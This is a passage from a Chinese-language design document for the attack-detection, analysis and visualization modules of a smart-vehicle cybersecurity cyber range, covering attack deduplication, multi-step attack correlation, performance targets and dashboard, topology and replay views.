少冗余信息，提高数据处理效率，同时确保每个基础攻击事件都能够被唯一标识。索引功能使用户能够迅速定位与特定基础攻击事件相关联的原始事件，无论是源IP地址、目的IP地址、端口信息还是其他攻击特征。这样的索引机制有效简化了用户的查询过程，提供了更为便捷的数据检索体验。用户可以通过系统提供的查询接口输入关键信息，如攻击类型、IP地址、端口等，系统将根据索引找到匹配的原始事件。这种索引与查找的结合，使用户能够更加高效地对基础攻击数据进行深入分析，并在需要时追溯到具体的原始事件，为网络安全决策提供更为全面的信息支持。</li><li>系统提供强大的多条件搜索功能，让用户能够根据各种关键条件精准地检索基础攻击数据。这些搜索条件包括但不限于检测时间、攻击类型、源IP地址、目的IP地址等。通过设定检测时间范围，用户可以在特定的时间段内检索基础攻击数据，实现对安全事件的时间粒度精确控制。攻击类型作为搜索条件之一，使用户能够根据攻击的性质，如扫描、溢出、拒绝服务等，进行分类检索，更好地了解网络面临的威胁。源IP地址与目的IP地址的搜索条件帮助用户聚焦于特定网络节点之间的攻击情况，有助于迅速定位攻击源和攻击目标。此外，用户还可以结合其他条件，如源端口、目的端口等，进行更为细致的搜索。</li><li>系统提供全面而直观的复杂攻击数据展示功能，让用户能够深入了解攻击的全貌。在展示页面中，包含了攻击名称、源IP地址、目的IP地址等关键信息对应的基础攻击步骤及链路详情，为用户提供了攻击事件的基本背景，更进一步，展示了复杂攻击涉及的基础攻击步骤，使用户能够清晰地了解攻击者的行动路径和攻击过程。每个基础攻击步骤都被详细描述，包括攻击类型、攻击描述等关键信息，为用户提供了攻击步骤的具体内容。此外，还提供了链路详情，展示了复杂攻击在网络中的传播路径。用户可以通过查看链路详情，了解攻击是如何从一个步骤演化到下一个步骤的，进而全面把握攻击事件的发展轨迹。这种细致入微的复杂攻击数据展示，有助于用户全面了解攻击的特征和威胁程度，为及时采取相应的安全措施提供了有力支持。</li><li>系统具有灵活而强大的试验任务导向的基础攻击与复杂攻击数据管理与搜索功能。用户可以根据试验任务的特定需求，轻松管理和搜索与任务相关的攻击数据。在基础攻击数据管理方面，用户可以方便地将基础攻击数据与特定的试验任务关联起来。系统提供了直观的操作界面，让用户能够轻松上传、检视和管理与试验任务相关的基础攻击数据。这有助于用户有序地组织和追踪不同试验任务下的攻击事件，使其更具可管理性。针对复杂攻击数据，系统同样支持基于试验任务的管理与搜索。用户可以根据任务名称、时间范围、攻击类型等多种条件，快速筛选出与特定试验任务相关的复杂攻击数据。这样，用户可以迅速找到并深入了解在试验任务中发生的复杂攻击事件。在搜索功能方面，提供了多条件搜索选项，包括攻击类型、时间、攻击源IP、目标IP等，让用户可以根据具体需求灵活地定位和检索与试验任务相关的攻击数据。这种搜索机制有助于用户高效地查找特定时间段、特定攻击类型或者特定攻击源的数据。</li></ol><h4 id="性能实施方案-25"><a href="#性能实施方案-25" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>系统在复杂攻击检测方面表现卓越，性能超过每秒2000条。这意味着系统能够高效、迅速地分析和识别各种复杂攻击事件，为用户提供实时的安全威胁感知和响应。这样的高性能确保了系统在处理大规模、高密度攻击数据时仍能保持出色的效率和准确性，满足用户对网络安全的高要求</li></ol><h4 id="技术实现内容-25"><a href="#技术实现内容-25" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="方案设计-12"><a href="#方案设计-12" class="headerlink" title="方案设计"></a>方案设计</h5><p>功能参数为，系统支持基础攻击去重，标记基础攻击数据可链用于后续复杂攻击关联分析。基于试验资产漏洞探测结果进行有效攻击检测。多维关联关系基于“资产-漏洞-攻击”进行有效基础攻击检测。将安全事件融合产生基础攻击数据与试验脆弱性关联分析，生成有效攻击。分析生成有效基础攻击，源目IP、端口、VLAN识别攻击来源队伍或选手、目标。发送基础攻击数据至大数据平台。接收安全事件流数据，内存缓存攻击检测匹配分析。接收试验攻击子图注册到流计算引擎，动态更新。接收试验停止指令，清除子图信息。利用攻击时间空间关系特征关联分析安全事件流数据。基于流计算分析技术实时多步攻击序列分析。基于可链基础攻击数据与流计算生成复杂攻击。支持APT攻击、DDoS攻击等多步复杂攻击事件检测。基于智能汽车安全攻击场景的复杂攻击检测。阈值类攻击检测，可自定义设置检测间隔、阈值。基于试验成果推导生成复杂攻击。复杂攻击有效性判断，关联有效基础攻击数据识别有效复杂攻击。发送复杂攻击数据至大数据平台。基于网络靶场多试验并行处理分析。展示基础攻击数据，基于去重后基础攻击数据索引原始事件。多条件搜索基础攻击数据。展示复杂攻击数据。基于试验任务进行基础攻击与复杂攻击数据管理搜索。</p><p>性能参数为，复杂攻击检测性能超过2000条/秒。</p><p>本方案旨在设计并实施一个智能汽车网络安全攻击检测与分析系统，该系统将利用先进的数据处理技术和算法，对智能汽车网络安全攻击事件进行深入分析与检测。系统将支持攻击数据的去重、链标记、有效攻击检测、攻击来源识别、数据存储、实时分析、复杂攻击检测等多种功能，并能够处理多试验任务的并行分析。系统的性能设计将确保复杂攻击检测性能超过2000条/秒。</p><p>攻击数据处理</p><p>基础攻击去重：系统支持基于不同攻击类型知识体系中的去重策略（二元组、三元组、四元组）进行基础攻击数据的去重。</p><p>基础攻击数据链标记：为基础攻击数据添加可链标记，为后续复杂攻击关联分析提供支持。</p><p>有效攻击检测</p><p>资产漏洞探测结果分析：基于试验的资产漏洞探测结果，进行有效攻击检测。</p><p>多维关联攻击检测：支持基于“资产-漏洞-攻击”多维关联关系，进行有效基础攻击检测。</p><p>安全事件与脆弱性关联分析：试验中将安全事件产生的基础攻击数据与试验的脆弱性进行关联分析，生成有效攻击，过滤无效攻击。</p><p>攻击类别检测验证：支持基于攻击突破类、远程控制与窃取利用类攻击类别，进行有效攻击检测验证，生成有效攻击数据。</p><p>攻击数据来源识别：分析生成的有效基础攻击，根据攻击数据中的源目IP、端口、VLAN识别攻击数据来源队伍（或选手）、攻击目标。</p><p>数据存储与流处理</p><p>基础攻击数据存储：将生成的基础攻击数据发送并存储到大数据平台。</p><p>安全事件流数据内存缓存：接收融合后的安全事件流数据，进行内存缓存用于攻击检测匹配分析。</p><p>试验攻击子图注册与更新：接收试验攻击子图并注册到流计算引擎中，并支持动态更新。</p><p>试验停止指令处理：接收试验停止指令，清除试验相关子图信息。</p><p>复杂攻击检测</p><p>安全事件流关联分析：利用攻击之间时间与空间关系特征，对安全事件流数据进行关联分析。</p><p>实时多步攻击序列分析：基于流计算分析技术和滑动时间窗口，实时进行多步攻击序列分析。</p><p>复杂攻击关联组合生成：基于可链基础攻击数据与流计算生成的多步攻击序列数据，关联组合生成多节点、跨多域的复杂攻击。</p><p>多步复杂攻击事件检测：支持APT攻击、DDoS攻击等类型多步复杂攻击事件检测。</p><p>智能汽车安全场景复杂攻击检测：基于智能汽车安全攻击场景的复杂攻击检测，检测结果包括攻击类型、攻击源、被攻击靶标等。</p><p>阈值类攻击检测：支持阈值类攻击检测，用户可设置检测间隔、阈值等参数，实现webshell远程控制、暴力破解等攻击检测。</p><p>复杂攻击推导生成：基于试验成果推导生成复杂攻击，关联分析获得复杂攻击步骤生成复杂攻击。</p><p>复杂攻击的有效性判断：进行有效复杂攻击识别，关联有效基础攻击数据进行判断。</p><p>复杂攻击数据存储：将生成的复杂攻击数据发送并存储到大数据平台。</p><p>并行处理与分析</p><p>多试验并行处理与分析：支持基于网络靶场的多试验并行处理与分析。</p><p>数据展示与管理</p><p>基础攻击数据展示：支持基础攻击数据的展示，包括攻击类型、源IP地址、目的IP地址等。</p><p>去重后数据索引：支持基于去重后的基础攻击数据，索引找到其原始事件。</p><p>基础攻击数据多条件搜索：支持多条件搜索基础攻击数据，搜索条件包括检测时间、攻击类型等。</p><p>复杂攻击数据展示：支持复杂攻击数据展示，包括攻击名称、源IP地址、目的IP地址等。</p><p>攻击数据管理与搜索：支持基于试验任务进行基础攻击与复杂攻击数据的管理与搜索。</p><p>复杂攻击检测性能：系统的复杂攻击检测性能应超过2000条/秒。</p><p>通过实现本方案，将建立一个能够高效检测和分析智能汽车网络安全攻击的系统。该系统将为智能汽车网络安全提供全面的技术支持，从基础攻击的识别到复杂攻击的构建，确保了网络安全的实时监控和快速响应。此外，系统的高性能设计和多试验任务的并行处理能力将大大提高智能汽车网络安全攻击检测的效率和准确性。</p><h5 id="方案介绍-2"><a href="#方案介绍-2" class="headerlink" title="方案介绍"></a>方案介绍</h5><p>网络靶场的多试验支持并行处理与分析，攻击检测支持并行处理与分析靶场多个试验的采集数据，根据态势分析任务管理模块配置的子任务，态势分析基于子任务采集的数据，结合知识图谱注册的攻击模板进行攻击检测研判，分析出流量中的基础攻击和复杂攻击，并于态势可视化模块进行界面展示。</p><p>攻击检测研判首先需要采集TCP、UDP传输协议的syslog安全事件日志，这些日志由数据采集分系统通过Kafka消息数据交互给智能汽车网络靶场态势分析分系统进行转换工作。</p><p>分系统可以提供对国内一些常见大众的安全厂商检测设备产品日志标准化的支持，可将其转换为标准格式处理生成安全事件，基于安全事件、基础攻击及其关系的知识体系实时融合安全事件生成基础攻击实现实时攻击检测。通过安全事件融合生成的基础攻击数据，对相关信息进行整合，将其与试验的脆弱性(CWE)进行关联分析，从而产生有效的攻击，同时，对于那些无效的攻击，系统将进行过滤处理，确保最终呈现的数据集具有高度的准确性和实用性。可以通过试验任务ID进行基础攻击数据的管理和搜索，界面上提供多条件搜索基础攻击数据，搜索条件包括了检测时间、攻击类型、源IP地址、目的IP地址等多个方面，这一功能设计旨在帮助用户更便捷地了解和分析系统中的攻击情况，提供有效的数据管理和检索工具。生成的基础攻击，呈现的数据包括攻击描述、目的端口（简称DPORT）、源端口（简称SPORT）、攻击类型、源IP地址（简称SIP）、目的IP地址（简称DIP）等内容信息。同时，数据将发送并存储到大数据平台。融合后的安全事件流数据会进行内存缓存用于攻击检测匹配分析，同时还具备支持实时动态更新的功能，在接收试验攻击子图的同时，系统会将其有效地注册到流计算引擎中，当试验结束时，会根据停止指令，清除试验相关子图信息。</p><p>基础攻击去重是基于基础攻击类型知识体系中不同攻击类型的去重策略进行去重，去重策略包括二元组去重，也就是根据源目IP进行去重；三元组去重，也就是根据源目IP和目的端口进行去重；四元组去重，也就是根据源目IP和源目端口进行去重。根据试验的资产漏洞探测结果，对漏洞安全事件进行有效攻击检测，有效攻击检测包含资产与漏洞的关联，漏洞与攻击的关联，最后达到资产与攻击的关联等多维关联关系。去除重复后的基础攻击数据，可以通过索引查找到相应的原始事件。并进行可链标记，用于后续复杂攻击关联分析。超危窃取利用类、高危远程控制类、中危攻击突破类，能够对其进行有效攻击检测验证，并产生有效攻击数据。还可以通过阈值类攻击检测对基础攻击进行相应检测，用户可自由设定检测周期间隔、阈值相关等参数要求，可实现web站点漏洞扫描、扫描探测、暴力破解、webshell远程控制等类型的攻击检测。并且能够识别攻击数据来源(队伍或是选手)、攻击目标是通过攻击数据中的源目IP、端口、VLAN。</p><p>利用攻击数据之间的时间以及空间关系特征，关联分析安全事件流数据。采用流计算分析技术和滑动时间窗口，实时进行多步攻击序列分析，多步攻击序列数据是由流计算以及可链基础攻击数据生成的，关联组合生成多节点、跨多域的复杂攻击。此外，还可以根据试验成果推导生成生成复杂攻击步骤，最终产生复杂攻击，将生成的复杂攻击数据发送并储存至大数据平台。</p><p>复杂攻击的有效性判断，是通过关联有效基础攻击数据，自动判定为有效复杂攻击。复杂攻击包括APT攻击、DDoS攻击等类型多步复杂攻击事件检测，以及智能汽车安全攻击场景的复杂攻击检测，检测结果涵盖了被攻击靶标、攻击源以及攻击类型，靶标涵盖了动力域控靶标、底盘域控靶标、车身域控制器靶标、网关靶标、TBOX靶标以及OTA靶标等。可根据试验任务ID进行复杂攻击数据管理与搜索。复杂攻击检测对于安全事件实时处理能达到2500条/秒。复杂攻击数据展示涵盖了链路详情、对应的基础攻击步骤、目的IP地址（简称DIP）、源IP地址（简称SIP）以及攻击名称等信息。</p><p>从各试验采集到的日志数据，经过解析处理转换为安全事件，分系统提供攻击检测界面，对融合后安全事件、基础攻击和复杂攻击检测结果分页签进行展示。</p><p>攻击研判的处理流程如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9b324fc18bf356d0618db0fcead589d0.png"></p><p>安全事件页签展示从各试验的日志数据解析得到的安全事件，包括数据来源、安全事件ID、检测时间、攻击源、攻击目的、源端口、目的端口、协议、源mac、目的mac，支持单击事件ID查看原始日志，支持根据数据来源和检测时间精确筛选，支持根据安全事件ID、攻击源、攻击目的、源端口、目的端口、协议、源mac、目的mac模糊检索。</p><p>基础攻击页签展示从各试验的安全事件融合得到的基础攻击，包括数据来源、检测时间、攻击类型、威胁等级、协议、目的端口、有效性、目的IP、源IP、源端口、规则ID，并且可以单击详情显示基础攻击关联的队伍、队员、节点等详细信息，并且可以单击弹窗显示所有相关原始日志，支持根据数据来源、检测时间和有效性精确筛选，支持根据攻击类型、威胁等级、规则ID、源IP(SIP)、目的IP(DIP)、源端口(SPORT)、目的端口(DPORT)、源mac、目的mac、协议模糊检索。</p><p>复杂攻击页签展示从各试验的基础攻击基于时空关系组链得到的复杂攻击，包括数据来源、检测时间、复杂攻击名称、源IP、目的IP、有效性，支持单击基础攻击步骤查看步骤详情，包括基础攻击名称、检测时间利用漏洞、步骤序号以及使用工具等详细信息，支持根据数据来源和有效性精确筛选，支持根据复杂攻击名称、源IP、目的IP模糊检索。</p><h3 id="态势可视化展示模块"><a href="#态势可视化展示模块" class="headerlink" title="态势可视化展示模块"></a>态势可视化展示模块</h3><h4 id="功能实施方案-26"><a href="#功能实施方案-26" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><ol><li><p>提供强大的可视化效果图设计功能，通过方案评审确保设计方案符合期望和需求后，将进行实施。设计阶段包括详细的用户界面(UI)和用户体验(UX)设计，以确保系统的可视化呈现能够直观、易用、符合用户操作习惯。在实施过程中，将严格按照设计方案进行开发和部署，以实现高质量、高性能的可视化效果。</p></li><li><p>系统在资产展示方面提供了全面而直观的功能，为用户提供了详尽的资产管理视图，覆盖资产数量、资产类型分布等资产视图。首先，系统能够清晰呈现当前系统中的总体资产数量，为用户提供了一个直观的了解系统规模的指标。其次，提供了资产类型分布的详细展示，通过图表和图形直观地展现各种资产类型在整个系统中的分布情况。这包括但不限于硬件设备、软件应用、网络设备等不同类型的资产。用户可以通过交互式界面轻松导航和筛选资产信息，以满足其特定需求。这种细致入微的资产展示使用户能够深入了解其网络中的各种资源，为系统的有效管理和保障提供了有力支持。无论是需要查看整体概况还是深入分析某一特定类型的资产分布，系统都为用户提供了直观、全面的展示功能，助力用户更好地进行资产管理和决策。</p></li><li><p>系统在漏洞展示方面提供了全面而详细的功能，旨在帮助用户全面了解和有效管理系统中的漏洞情况，提供漏洞类型数量分布、漏洞危险程度占比分布等数据展示。首先，通过直观的图表和图形呈现了系统中不同漏洞类型的数量分布，使用户能够一目了然地了解各种漏洞在系统中的分布情况。这有助于用户更有针对性地采取措施，优先解决系统中数量较多或风险较高的漏洞。其次，提供了漏洞危险程度占比分布的详细展示，通过清晰的图形界面展示各个漏洞的危险级别，帮助用户判断和处理漏洞时能够更有侧重地进行决策。用户可以通过交互式界面深入查看漏洞详情，包括CVE编号、危害等级、漏洞类型、威胁类型等关键信息，为漏洞修复和系统安全提供有力的支持。</p></li><li><p>系统提供了强大的流量展示功能，以便用户全面了解系统中的网络流量情况。首先，通过流量协议统计分布，清晰地呈现了不同网络协议在系统中的使用情况。用户可以通过直观的图表和图形界面快速了解每种协议所占的比例，帮助他们识别和监测系统中可能存在的风险和异常流量。其次，提供了流量趋势的展示，用户可以随时查看系统中流量的历史变化趋势。这有助于用户识别系统中的流量高峰和低谷，更好地了解系统在不同时间段内的网络活动情况。用户可以通过交互式的界面选择特定的时间范围，深入分析流量的变化，以便更及时地做出相应的网络管理和优化决策。</p></li><li><p>系统中的可视化展示提供了宏观和微观两种不同层次的视角，以满足用户对于系统整体概况和详细信息的需求。在宏观可视化方面，用户可以通过系统总览图或仪表盘快速把握系统的整体状态。总览图以直观的图形形式展示了系统中关键指标和重要元素的分布情况，让用户一目了然地了解整个系统的运行状况。仪表盘则提供了实时的系统概览，通过图表和指标的汇总展示，用户可以迅速获取系统的整体性能、安全状态等关键信息。而在微观可视化方面，用户可以深入到具体的资产、漏洞、攻击等细节信息。通过交互式的界面，用户能够深入挖掘每个资产或漏洞的详细情况，查看与之关联的攻击数据，实现对微观层面的深入监测和分析。这种微观可视化的展示方式让用户能够更全面地了解系统中的细节，有助于精准的安全管理和决策。</p></li><li><p>系统具备多种可视化展示模式，以满足不同的应用场景需求，包括但不限于夺旗赛、攻防赛、红蓝对抗和综合演练等。在夺旗赛场景下，提供了直观的旗帜状态图，清晰展示各队伍夺取旗帜的进展情况。这种可视化方式使裁判和参与者能够实时监控夺旗赛的动态，更好地组织和协调比赛过程。在攻防赛中，通过图表展示各队伍攻防数据，包括攻击成功率、防御效果等关键指标。这种细致入微的可视化分析有助于评估每支队伍的表现，为裁判提供客观的数据支持。红蓝对抗场景下，提供了双方实时对战的图形展示，包括攻击路径、目标资产状态等，帮助红方和蓝方更好地了解对方的攻防情况，从而进行更有效的应对和反击。在综合演练中，将多个场景综合展示，通过仪表盘和总览图的方式，将整个演练的综合数据以清晰的形式呈现，让组织者和参与者能够全面了解演练的整体进展。</p></li><li><p>系统支持先进的汽车3D建模与展示功能，通过该功能，用户能够以直观的方式查看和分析汽车的结构、组成和布局，展示对应的靶标及攻击信息。在这个3D建模环境中，用户可以准确呈现车辆的外观、零部件、传感器、控制单元等各个方面的细节。这种3D建模的汽车展示不仅仅停留在静态的外观呈现，还能够实时显示汽车的状态变化、组件之间的互动关系等实时数据。用户可以旋转、缩放和平移汽车模型，以获取全方位的视角，深入了解车辆的各个方面。更重要的是，系统将攻击信息与汽车3D模型进行关联展示。当发生攻击时，系统会在3D模型上标示受影响的区域，突显可能的攻击路径、攻击目标和受影响的零部件。这种直观的可视化展示，使用户能够更加深入地理解网络攻击如何影响汽车的各个方面，有助于深入分析攻击的威胁程度和潜在风险。</p></li><li><p>系统支持地图模式的宏观可视化，为用户提供了全面而直观的试验数据呈现方式，包括地图、图表、动画连线等。地图模式以图形地图为基础，将试验相关信息在地图上以直观的形式展示，包括各个节点、队伍、设备等元素。这样的设计使用户能够一目了然地了解试验的整体布局和组成。在地图模式中，用户可以轻松地导航和查看各个试验元素的分布情况。通过交互式地图界面，用户能够快速定位关键节点、靶标、队伍等，实现对试验拓扑结构的全面认知。图标的形式使用户能够直观地辨识元素的类型，从而更有效地进行数据分析。图表是地图模式中的另一重要组成部分，通过图表展示试验中的关键数据统计和趋势分析。这包括攻击趋势、漏洞分布、攻击成功率等方面的数据，为用户提供了对试验整体安全状况的深入理解。图表的直观呈现使用户能够及时识别潜在风险和趋势。动画连线是地图模式中的引人注目的特色之一。通过动态的线条或箭头展示节点之间的关联和数据流动，用户能够追踪攻击路径、观察攻击传播过程，形成对试验动态的清晰认识。</p></li><li><p>系统强大的宏观可视化功能支持各种地理层级的灵活动态生成与加载，包括中国、省、市等多层级的地图。这一功能使用户能够在多种地理尺度上深入了解试验的整体情况，更好地把握关键信息。首先，系统可以根据用户的需求，动态生成中国地图，以呈现全国范围内的试验布局和相关信息。这对于需要全局视角的决策者和管理员来说尤为重要，他们可以一眼了解不同区域的试验状态和攻击情况。其次，用户还可以根据需要加载省级地图，进一步深入到各个省份的试验细节。这样的分层设计有助于地方性问题的发现和处理，也方便用户根据地域划分进行定制化的数据分析。在更详细的层面上，系统支持市级地图的生成和加载，使用户能够深入到每个城市的试验场景，实时了解地方性的攻击与防御动态。</p></li><li><p>系统提供了丰富的可视化展示功能，特别针对汽车靶标的基础攻击、有效攻击以及复杂攻击，为用户提供直观而详细的试验信息，以及统计图表的展示和攻击信息播报。首先，基于汽车靶标的基础攻击动态飞线展示，用户可以通过系统直观地观察到攻击源与目标之间的关联关系。这种动态飞线的可视化效果，使用户能够迅速捕捉到攻击的传播路径，帮助他们更好地理解攻击事件的演进。其次，有效攻击的可视化展示以统计图表的形式呈现。用户可以通过直观的图表了解有效攻击的类型分布、攻击来源、攻击目标等关键信息。这有助于用户快速把握有效攻击的整体情况，便于迅速制定相应的应对策略。另外，复杂攻击的动态飞线同样得到了精心设计。系统通过可视化方式展示复杂攻击的多步骤过程，帮助用户深入了解攻击的时序关系和空间关系。这种细致入微的可视化展示有助于用户从更深层次理解攻击的本质和危害。对于攻击信息播报功能，注重信息的实时性和准确性。该功能能够实时监测网络靶场中的攻击活动，一旦发现异常行为或攻击事件，立即进行报警和播报。报警信息包括攻击源、攻击目标、攻击类型、攻击流量等关键信息，能够帮助用户快速了解场景中的攻击态势。</p></li><li><p>系统支持试验信息统计展示，包括实时攻击数据、攻击趋势、受攻击排行等信息。这种功能使得用户能够实时了解攻击数据和趋势，为防御策略的调整提供依据。同时，受攻击排行等信息也有助于用户了解攻击的来源和目标，为进一步的防御和应对提供参考。通过实时数据分析和可视化展示，用户可以更加全面地了解靶场的安全态势，提高网络靶场的防御能力和安全性。</p></li><li><p>系统在外网IP情报知识管理方面具备强大的自动加载和定位功能，以提供更加直观、地理位置敏感的攻击展示。首先，支持基于IP地址的自动加载外网IP情报知识。通过与互联网公开渠道的实时数据同步，这确保了系统中的IP情报知识始终保持最新、全面。其次，系统能够通过IP地址与地图坐标进行自动定位。这意味着，对于试验中实时攻击的源目IP地址，系统可以智能地将攻击定位到特定的地理位置。这种地理位置敏感的攻击信息展示方式使用户能够更清晰地了解攻击的来源与目标，从而更有针对性地制定应对策略。最重要的是，实现了自适应的因特网场景攻击展示。系统能够根据攻击的IP地址自动识别其地理位置，并将这些攻击信息巧妙地呈现在地图上，为用户提供了一种更加直观的方式来理解攻击活动的地域分布。</p></li><li><p>系统提供了丰富多样的微观可视化展示方式，旨在通过拓扑结构、动画连线和图表等形式，为用户呈现详细而清晰的试验数据。首先，支持拓扑结构的微观可视化展示。用户可以在系统中查看试验网络的整体拓扑结构，包括各个节点之间的关系以及网络拓扑的层次结构。这有助于用户更直观地理解试验中各个组件的连接方式和依赖关系，为网络安全分析提供了直观的基础。其次，实现了动画连线的微观可视化效果。通过动态展示攻击过程中节点之间的连接情况，用户能够追踪攻击路径、观察攻击传播的过程。这种实时动态的展示方式有助于用户更全面地把握攻击的演变过程，使其能够更迅速地做出反应。最后，提供了图表形式的微观可视化展示。用户可以通过图表直观地了解试验中各项指标的变化趋势、攻击事件的数量分布等信息。这种图表形式的呈现方式使得用户能够更深入地分析试验数据，从而更有针对性地进行安全决策。</p></li><li><p>系统在微观拓扑的可视化展示中，充分考虑到用户的个性化需求，支持展示对应汽车靶标节点的详细信息，并提供了节点名称可编辑的功能。首先，用户可以在微观拓扑图中直观地查看与汽车靶标相关的各个节点，例如车联网业务管理后台、TBOX、网关、车机、域控制器等。每个节点都以直观的图标或标识形式呈现，使用户轻松识别不同类型的节点。其次，系统提供了节点信息的详细展示功能。通过点击特定节点，用户可以查看与该节点相关的详细信息，包括节点的基本属性、状态、关联的资产信息等。这有助于用户全面了解每个节点在试验中的作用和特征。另外，还为用户提供了节点名称可编辑的便捷功能。用户可以根据实际需求对节点名称进行编辑，使其更符合试验场景的实际情况。这样的设计灵活性，有助于用户根据试验的具体情境定制节点名称，提高系统的适用性。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/82e6dd2f41a8167c5f09a302c2439b82.png"></p></li><li><p>系统在拓扑节点的展示中支持灵活的信息标注功能，允许用户自定义并展示与拓扑节点相关的资产、安全事件等统计信息。首先，用户可以选择特定的拓扑节点，例如车联网业务管理后台、TBOX、网关、车机、域控制器等，然后通过系统提供的标注功能，在节点周围或节点本身标注显示相关信息。这些信息可以包括资产数量、漏洞类型分布、安全事件统计等。其次，用户可以根据试验的需求自定义标注的内容，系统支持展示各类文本信息、图表等，以便用户根据具体的情境定制节点上的信息展示。这样，用户可以根据试验的实际情况将关键的统计信息直观地标注在拓扑节点上，方便快速了解节点的状态和试验进展。</p></li><li><p>系统支持基于试验环境拓扑数据自动生成全局3D树形拓扑可视化图形。这一功能的设计旨在提供更直观、立体感强的试验环境展示，以便用户全面了解网络拓扑结构、节点关系和通信路径。首先，系统会根据试验环境的实际拓扑数据，自动构建3D树形拓扑结构。这包括试验中涉及的各类节点，如车联网业务管理后台、TBOX、网关、车机、域控制器等，以及它们之间的连接关系。其次，系统将这些节点和连接以树形结构进行组织，并在3D场景中呈现。这种呈现方式使用户能够清晰地看到各节点之间的上下级关系，以及整体拓扑结构的层级关系。用户可以通过旋转、缩放等操作自由调整视角，以更全面地了解试验环境的整体布局。在这个3D树形拓扑中，每个节点都可以点击，展开详细信息，包括节点名称、资产信息、漏洞状况等。这种交互式的设计使用户能够方便地深入了解每个节点的具体情况。</p></li><li><p>系统具备实时接收APT等复杂攻击数据的功能，并通过直观的方式将复杂攻击在拓扑结构中进行呈现。这通过画线的方式，清晰地展示攻击路径和涉及的节点，使用户能够迅速识别并理解复杂攻击的传播过程，时信息面板同步展示对应步骤的基础攻击信息。当系统接收到复杂攻击数据时，自动在拓扑图上画线，将攻击路径可视化呈现。每一条线代表攻击的传播路径，连接相应的节点，帮助用户迅速追踪攻击的传播途径。这样的直观呈现方式有助于用户更加直观地了解攻击的蔓延情况。同时，系统的信息面板会同步展示与复杂攻击相关的详细信息，包括攻击的具体步骤、基础攻击类型、攻击源、攻击目标等。这为用户提供了全面的攻击信息，使其能够深入分析攻击过程中的每一个关键步骤。</p></li><li><p>系统提供了对汽车攻防演练场景复杂攻击行为进行回放展示的功能。这项功能允许用户在事后对先前进行的汽车攻防演练场景中的复杂攻击行为进行回放，并以可视化的方式展示攻击的每个步骤。用户可以选择特定的演练场景和相应的复杂攻击事件，然后通过系统界面设置回放参数，包括时间段、回放速度等。系统会根据用户的选择，以时间轴的形式呈现攻击事件的发生顺序，同时支持在不同时间点进行细致的回放和观察。在回放展示过程中，系统将以图形化的界面展示每个复杂攻击步骤，包括基础攻击类型、攻击路径、受影响的节点等信息。这种可视化展示有助于用户全面理解攻击的执行过程，洞察攻击者的行为和攻击路径。</p></li><li><p>系统支持用户在回放展示时选择指定的时间段以及特定的攻击事件，以便深入研究和详细展示复杂攻击的执行过程、攻击路径和攻击详情。通过系统界面，用户可以灵活地指定时间范围，使其可以聚焦于感兴趣或关键的攻击时刻。此外，用户还能够选择具体的攻击事件，以便系统在回放中集中展示用户所选攻击的详细信息。在回放展示过程中，系统将以图形界面的形式清晰呈现复杂攻击的每个步骤。用户可以观察攻击者的行为路径、攻击过程中涉及的节点、攻击类型等详细信息。此外，系统还提供攻击详情的展示，包括攻击者使用的工具、利用的漏洞、攻击成功的节点等信息，使用户能够全面理解攻击的本质。</p></li><li><p>系统为用户提供了通过鼠标快速进行放大和缩小操作的功能，以满足在不同场景下对可视化查看的灵活需求。通过简单的鼠标滚动操作，用户可以方便地调整可视化图表的缩放比例，实现对拓扑结构、攻击路径或其他相关图表的放大和缩小。这种直观的操作方式使用户能够根据具体需求调整视图，更清晰地观察和分析图形数据。这种交互式的放大和缩小功能不仅提高了用户对大规模网络拓扑或复杂攻击路径的查看效率，也增强了系统的可操作性。</p></li><li><p>系统提供了全面的基础攻击统计分析与查看管理功能，旨在为用户提供清晰的攻击态势和详细的攻击信息，包括攻击类型统计、趋势统计，能够支持用户查询基础攻击详细信息。首先，系统支持攻击类型的统计分析，用户可以轻松了解各类攻击在试验中的分布情况。这包括对不同攻击类型的数量、频率以及相对比例的直观呈现，使用户能够迅速识别试验中的主要攻击趋势。其次，系统提供了攻击趋势统计功能，用户可以通过可视化图表或图形化趋势线来观察攻击活动的演变过程。这有助于用户识别攻击高峰期、低谷期或其他可能的攻击模式，为进一步的安全分析提供基础。除了统计信息外，系统还支持基础攻击详细信息的查询与管理。用户可以根据特定的时间范围、攻击类型、源IP地址、目的IP地址等条件，灵活地筛选和查看有关基础攻击的具体信息。这包括攻击描述、攻击来源、目标信息、攻击时间等详细数据，为用户提供深入分析攻击活动的工具和视角。</p></li><li><p>系统不仅提供了全面的基础攻击管理与分析功能，还强力支持复杂攻击的查看、分析和管理，为用户提供全方位的攻击活动洞察力。首先，系统支持用户对复杂攻击的查看和分析。通过直观的图形化界面，用户可以轻松地观察到复杂攻击的整体结构和关联关系。这包括攻击的步骤、涉及的基础攻击、时序关系等多维度信息，帮助用户深入了解复杂攻击的实际构成。其次，系统提供了对具体复杂攻击的详细管理功能。用户可以选择特定的复杂攻击，查看与之相关的详细信息，包括攻击名称、攻击步骤、涉及的基础攻击、攻击时间等关键数据。这有助于用户更深入地理解攻击事件，并采取相应的防范和应对措施。最重要的是，系统支持直接查看对应的攻击子图。这使用户能够更加直观地理解复杂攻击的节点、关系、时序性，从而更有效地进行安全分析和决策。这种图形化展示方式为用户提供了一种直观而深入的了解复杂攻击的途径，使其能够更加高效地应对潜在的威胁。</p></li><li><p>系统支持直观且详细的复杂攻击子图查看功能，旨在提供用户全面了解复杂攻击结构、步骤及相关信息的便捷工具。首先，用户可以轻松查看复杂攻击子图的各个攻击步骤。通过系统的图形界面，用户能够清晰地观察到每个攻击步骤的连接关系，形成完整的攻击链路。这有助于用户深入理解攻击的执行过程，从而更有针对性地采取相应的安全措施。其次，系统展示了与复杂攻击子图关联的安全事件。用户可以迅速识别出攻击过程中引发的各类安全事件，帮助其快速作出响应和应对。这种直观的展示方式有助于用户全面了解攻击的实际影响，及时采取防范措施。最重要的是，用户还能够查看与复杂攻击子图关联的漏洞信息。系统将攻击步骤与相关漏洞进行关联，使用户能够直观了解攻击的潜在风险源。这有助于用户有针对性地加固系统漏洞，提高整体安全性。</p></li><li><p>系统提供了强大的有效攻击查看分析与管理功能，支持用户对有效基础攻击和有效复杂